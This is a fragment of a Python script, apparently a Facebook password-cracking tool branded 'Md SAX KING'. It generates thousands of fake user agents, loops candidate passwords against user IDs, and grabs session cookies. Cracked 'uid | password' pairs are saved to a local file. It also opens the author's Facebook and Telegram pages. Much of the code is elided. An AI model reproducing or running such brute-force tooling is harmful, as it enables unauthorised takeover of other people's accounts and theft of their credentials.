...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/profile.php?id=61551401980936/")
# LOGO
logo = ("""
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mMd SAX KING ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • Md SAX KING ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mMd-SAX ]   ║\33[1;34m   
...
def Main():
        ...
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open t.me/.me/+8801814032575')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
...
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[SAX-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
""")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mSAX-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/SAXCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
